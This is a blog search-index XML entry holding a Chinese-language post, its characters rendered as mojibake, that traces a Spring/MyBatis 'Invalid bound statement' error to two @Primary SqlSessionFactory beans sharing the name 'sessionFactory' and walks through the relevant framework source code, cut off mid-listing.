<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Springä¸­bean nameé‡å¤çš„é—®é¢˜]]></title>
      <url>http://qsli.github.io/2020/04/29/spring-bean-duplic-name/</url>
      <content type="html"><![CDATA[<h2 id="ç°è±¡"><a href="#ç°è±¡" class="headerlink" title="ç°è±¡"></a>ç°è±¡</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.atour.oss.dao.mapper.OssFileMapper.insert</span><br><span class="line"></span><br><span class="line">	at org.apache.ibatis.binding.MapperMethod<span class="variable">$SqlCommand</span>.&lt;init&gt;(MapperMethod.java:227)</span><br><span class="line">	at org.apache.ibatis.binding.MapperMethod.&lt;init&gt;(MapperMethod.java:49)</span><br><span class="line">	at org.apache.ibatis.binding.MapperProxy.cachedMapperMethod(MapperProxy.java:65)</span><br><span class="line">	at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:58)</span><br><span class="line">	at com.sun.proxy.<span class="variable">$Proxy188</span>.insert(Unknown Source)</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªåŒäº‹æ–°åŠ äº†ä¸€ä¸ªæ•°æ®æºï¼Œç„¶åè€çš„æ•°æ®æºå±…ç„¶æŠ¥é”™äº†ï¼Œä»–è¯´æ²¡æœ‰æ”¹åŠ¨è€çš„ã€‚ç¿»äº†ä¸‹ä»£ç ï¼Œæœ€åå‘ç°æ˜¯<strong>ä¸åŠ æ€ç´¢åœ°å¤åˆ¶ç²˜è´´</strong>åŸ‹çš„å‘ï¼Œè€çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan</span>(basePackages = MapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åŒ…ç›®å½•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PACKAGE = <span class="string">"com.atour.oss.dao.mapper"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç±»ç›®å½•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TYPE_ALIASES_PACKAGE = <span class="string">"com.atour.oss.dao.entity"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * mapperæ‰€åœ¨ç›®å½•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MAPPER_LOCATION = <span class="string">"classpath*:mapper/oss/*.xml"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å‚æ•°é…ç½®</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dataSource æ•°æ®åº“ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resource   é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> SqlSessionFactory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(name = <span class="string">"sessionFactory"</span>)</span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">invitationSessionFactory</span><span class="params">(@Qualifier(<span class="string">"dataSource"</span>)</span> DataSource dataSource,</span></span><br><span class="line"><span class="function">        @<span class="title">Qualifier</span><span class="params">(<span class="string">"mybatisConf"</span>)</span> Resource resource) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        Resource[] mapperLocations = <span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(MAPPER_LOCATION);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(mapperLocations);</span><br><span class="line">        sqlSessionFactoryBean.setConfigLocation(resource);</span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(TYPE_ALIASES_PACKAGE);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ–°åŠ çš„ä»£ç :</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan</span>(basePackages = NoticeIntelligenceMapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoticeIntelligenceMapperConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åŒ…ç›®å½•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PACKAGE = <span class="string">"com.atour.noticeIntelligence.dao.mapper"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç±»ç›®å½•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TYPE_ALIASES_PACKAGE = <span class="string">"com.atour.noticeIntelligence.dao.entity"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * mapperæ‰€åœ¨ç›®å½•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MAPPER_LOCATION = <span class="string">"classpath*:mapper/noticeIntelligence/*Mapper.xml"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å‚æ•°é…ç½®</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dataSource æ•°æ®åº“ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resource   é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> SqlSessionFactory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(name = <span class="string">"sessionFactory"</span>)</span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">invitationSessionFactory</span><span class="params">(@Qualifier(<span class="string">"dataSource"</span>)</span> DataSource dataSource,</span></span><br><span class="line"><span class="function">        @<span class="title">Qualifier</span><span class="params">(<span class="string">"mybatisConf"</span>)</span> Resource resource) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        Resource[] mapperLocations = <span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(MAPPER_LOCATION);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(mapperLocations);</span><br><span class="line">        sqlSessionFactoryBean.setConfigLocation(resource);</span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(TYPE_ALIASES_PACKAGE);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„çœ‹beançš„åå­—ï¼Œå®Œå…¨ä¸€æ¨¡ä¸€æ ·ï¼ï¼ï¼ğŸ˜‚ï¼Œç›®æµ‹springåœ¨æŸ¥æ‰¾å¼•ç”¨çš„æ—¶å€™é”™ä¹±äº†ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¿©beanè¿˜éƒ½æ ‡è®°ä¸Šäº†<code>@Primary</code>ã€‚</p>
<h2 id="Primary"><a href="#Primary" class="headerlink" title="@Primary"></a>@Primary</h2><blockquote>
<pre><code>No matter how you designate a primary bean, the effect is the same. Youâ€™re telling
</code></pre><p>Spring that it should choose the primary bean in the case of ambiguity.</p>
<pre><code>This works well right up to the point where you designate two or more primary
</code></pre><p>beans.</p>
<pre><code>Now there are two primary Dessert beans: Cake and IceCream. This poses a new ambi
</code></pre><p>guity issue. Just as Spring couldnâ€™t choose among multiple candidate beans, it canâ€™t</p>
<p>choose among multiple primary beans. Clearly, when more than one bean is desig</p>
<p>nated as primary, there are no primary candidates.</p>
<p>â€‹                                                                â€”â€” ã€ŠSpring in action 4th Editionã€‹</p>
</blockquote>
<p><strong>Clearly, when more than one bean is designated as primary, there are no primary candidates </strong></p>
<p>å¦‚æœæœ‰å¤šä¸ª<code>@Primary</code>æ³¨è§£çš„beanï¼Œé‚£ä¹ˆå°±æ²¡æœ‰<code>primary</code>çš„candidateäº†ï¼›è¿™é‡Œè¯´çš„å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¯´springå…·ä½“æ€ä¹ˆå¤„ç†çš„ã€‚æ¯•ç«Ÿä¸Šé¢çš„é¡¹ç›®å¯åŠ¨çš„æ—¶å€™ä¹Ÿæ²¡æœ‰æŠ¥<code>ambiguity</code> ç›¸å…³çš„å¼‚å¸¸ã€‚</p>
<h2 id="MapperScan"><a href="#MapperScan" class="headerlink" title="MapperScan"></a>MapperScan</h2><p><code>MapperScan</code>æ˜¯mybatisæä¾›çš„æ³¨è§£ï¼Œç”¨æ¥æŒ‡å®šæ‰«ædaoå±‚æ¥å£çš„ç›®å½•å’Œmapperæ–‡ä»¶æ‰€åœ¨çš„ä½ç½®çš„æ³¨è§£ï¼Œä¸Šé¢åå­—å†²çªçš„beanæ˜¯é€šè¿‡ä¸‹é¢çš„å½¢å¼å¼•å…¥çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MapperScan</span>(basePackages = NoticeIntelligenceMapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸‹æºç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.mybatis.spring.annotation.MapperScannerRegistrar#registerBeanDefinitions</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinitions</span><span class="params">(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">// çœç•¥nè¡Œ</span></span><br><span class="line">    scanner.setSqlSessionTemplateBeanName(annoAttrs.getString(<span class="string">"sqlSessionTemplateRef"</span>));</span><br><span class="line">    <span class="comment">// è¿™é‡Œè·å–æ³¨è§£é‡Œå¯¹åº”çš„å±æ€§å€¼</span></span><br><span class="line">    scanner.setSqlSessionFactoryBeanName(annoAttrs.getString(<span class="string">"sqlSessionFactoryRef"</span>));</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; basePackages = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String pkg : annoAttrs.getStringArray(<span class="string">"value"</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(pkg)) &#123;</span><br><span class="line">        basePackages.add(pkg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (String pkg : annoAttrs.getStringArray(<span class="string">"basePackages"</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(pkg)) &#123;</span><br><span class="line">        basePackages.add(pkg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; clazz : annoAttrs.getClassArray(<span class="string">"basePackageClasses"</span>)) &#123;</span><br><span class="line">      basePackages.add(ClassUtils.getPackageName(clazz));</span><br><span class="line">    &#125;</span><br><span class="line">    scanner.registerFilters();</span><br><span class="line">    scanner.doScan(StringUtils.toStringArray(basePackages));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°å¯¹åº”å±æ€§ä½¿ç”¨çš„åœ°æ–¹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.mybatis.spring.mapper.ClassPathMapperScanner#processBeanDefinitions</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processBeanDefinitions</span><span class="params">(Set&lt;BeanDefinitionHolder&gt; beanDefinitions)</span> </span>&#123;</span><br><span class="line">    GenericBeanDefinition definition;</span><br><span class="line">    <span class="keyword">for</span> (BeanDefinitionHolder holder : beanDefinitions) &#123;</span><br><span class="line">      definition = (GenericBeanDefinition) holder.getBeanDefinition();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">        logger.debug(<span class="string">"Creating MapperFactoryBean with name '"</span> + holder.getBeanName() </span><br><span class="line">          + <span class="string">"' and '"</span> + definition.getBeanClassName() + <span class="string">"' mapperInterface"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// the mapper interface is the original class of the bean</span></span><br><span class="line">      <span class="comment">// but, the actual class of the bean is MapperFactoryBean</span></span><br><span class="line">      definition.getConstructorArgumentValues().addGenericArgumentValue(definition.getBeanClassName()); <span class="comment">// issue #59</span></span><br><span class="line">      definition.setBeanClass(<span class="keyword">this</span>.mapperFactoryBean.getClass());</span><br><span class="line"></span><br><span class="line">      definition.getPropertyValues().add(<span class="string">"addToConfig"</span>, <span class="keyword">this</span>.addToConfig);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">boolean</span> explicitFactoryUsed = <span class="keyword">false</span>;</span><br><span class="line">      <span class="comment">// è¿™é‡Œè®¾ç½®å¯¹åº”ä¾èµ–çš„å ä½</span></span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionFactoryBeanName)) &#123;</span><br><span class="line">        <span class="comment">// è¿™é‡Œçš„RunTimeBean</span></span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionFactory"</span>, <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionFactoryBeanName));</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionFactory != <span class="keyword">null</span>) &#123;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionFactory"</span>, <span class="keyword">this</span>.sqlSessionFactory);</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionTemplateBeanName)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">          logger.warn(<span class="string">"Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionTemplate"</span>, <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionTemplateBeanName));</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionTemplate != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">          logger.warn(<span class="string">"Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionTemplate"</span>, <span class="keyword">this</span>.sqlSessionTemplate);</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!explicitFactoryUsed) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">          logger.debug(<span class="string">"Enabling autowire by type for MapperFactoryBean with name '"</span> + holder.getBeanName() + <span class="string">"'."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.setAutowireMode(AbstractBeanDefinition.AUTOWIRE_BY_TYPE);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆä½¿ç”¨çš„æ˜¯<code>RuntimeBeanReference</code>ã€‚</p>
<h2 id="RuntimeBeanReference"><a href="#RuntimeBeanReference" class="headerlink" title="RuntimeBeanReference"></a>RuntimeBeanReference</h2><p><code>@Primary</code>æ³¨è§£æœ€ç»ˆè½¬æ¢æˆäº†beançš„<code>isPrimary</code>å±æ€§ï¼Œæœä»£ç å¯ä»¥å¤§æ¦‚çŸ¥é“æ˜¯åœ¨<code>DefaultListableBeanFactory</code>ä¸­å¤„ç†çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.beans.factory.support.DefaultListableBeanFactory#determinePrimaryCandidate</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Determine the primary candidate in the given set of beans.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> candidates a Map of candidate names and candidate instances</span></span><br><span class="line"><span class="comment">	 * (or candidate classes if not created yet) that match the required type</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> requiredType the target dependency type to match against</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the name of the primary candidate, or &#123;<span class="doctag">@code</span> null&#125; if none found</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #isPrimary(String, Object)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Nullable</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> String <span class="title">determinePrimaryCandidate</span><span class="params">(Map&lt;String, Object&gt; candidates, Class&lt;?&gt; requiredType)</span> </span>&#123;</span><br><span class="line">		String primaryBeanName = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : candidates.entrySet()) &#123;</span><br><span class="line">			String candidateBeanName = entry.getKey();</span><br><span class="line">			Object beanInstance = entry.getValue();</span><br><span class="line">			<span class="keyword">if</span> (isPrimary(candidateBeanName, beanInstance)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (primaryBeanName != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">boolean</span> candidateLocal = containsBeanDefinition(candidateBeanName);</span><br><span class="line">					<span class="keyword">boolean</span> primaryLocal = containsBeanDefinition(primaryBeanName);</span><br><span class="line">					<span class="keyword">if</span> (candidateLocal &amp;&amp; primaryLocal) &#123;</span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> NoUniqueBeanDefinitionException(requiredType, candidates.size(),</span><br><span class="line">								<span class="string">"more than one 'primary' bean found among candidates: "</span> + candidates.keySet());</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (candidateLocal) &#123;</span><br><span class="line">						primaryBeanName = candidateBeanName;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					primaryBeanName = candidateBeanName;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> primaryBeanName;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿™é‡ŒæŠ›å¼‚å¸¸äº†ï¼Œåº”è¯¥ä¸æ˜¯è¿™é‡Œ ğŸ™„</p>
<blockquote>
<p>é¦–å…ˆæ˜¯ä¿¡æ¯è§£æï¼Œå³å°†å±æ€§å®šä¹‰ä¸­çš„å€¼è¿›è¡Œè§£æï¼Œå¦‚RuntimeBeanReferenceè§£ææˆå¼•ç”¨çš„Beanå¯¹è±¡ï¼Œè¿™é‡Œä¼šè¿›è¡Œçº§è”è·å–beanä¿¡æ¯ï¼Œå¹¶è¿½åŠ dependä¿¡æ¯ã€‚è¿™ä¸€æ­¥åªæ˜¯è§£æã€‚</p>
</blockquote>
<p>åŸæ¥åœ¨è¿™é‡Œï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.beans.factory.support.BeanDefinitionValueResolver#resolveValueIfNecessary</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Given a PropertyValue, return a value, resolving any references to other</span></span><br><span class="line"><span class="comment">	 * beans in the factory if necessary. The value could be:</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A BeanDefinition, which leads to the creation of a corresponding</span></span><br><span class="line"><span class="comment">	 * new bean instance. Singleton flags and names of such "inner beans"</span></span><br><span class="line"><span class="comment">	 * are 